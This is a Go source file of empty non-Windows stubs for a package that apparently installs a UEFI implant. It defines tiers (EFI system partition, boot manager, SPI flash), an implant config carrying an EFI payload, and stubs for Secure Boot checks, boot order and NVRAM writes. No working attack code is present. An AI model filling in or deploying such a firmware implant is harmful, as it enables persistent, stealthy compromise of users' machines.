//go:build !windows

package uefi

// Non-Windows stubs.

type InstallTier int
const (
	TierESP      InstallTier = iota
	TierBootMgr
	TierSPIFlash
)

type UEFIImplantConfig struct {
	Tier           InstallTier
	EFIPayload     []byte
	EFIVendor      string
	EFIFilename    string
	BootOptionNum  uint16
	BootOptionDesc string
	KernelRW       interface{}
}

type UEFIInstallResult struct {
	Tier            InstallTier
	ESPPath         string
	BootOptionNum   uint16
	SecureBootState string
	SpiModified     bool
}

type ESPInfo struct {
	DevicePath  string
	DriveLetter string
	PartGUID    [16]byte
}

func Install(_ UEFIImplantConfig) (*UEFIInstallResult, error) { return nil, nil }
func Remove(_ UEFIImplantConfig) error                        { return nil }
func FindESP() (*ESPInfo, error)                               { return nil, nil }
func IsSecureBootEnabled() (bool, error)                       { return false, nil }
func IsSetupMode() (bool, error)                               { return false, nil }
func ReadBootOrder() ([]uint16, error)                         { return nil, nil }
func WriteBootOrder(_ []uint16) error                          { return nil }
func ReadNVRAM(_, _ string) ([]byte, uint32, error)            { return nil, 0, nil }
func WriteNVRAM(_, _ string, _ []byte, _ uint32) error         { return nil }
func DeleteNVRAM(_, _ string) error                            { return nil }
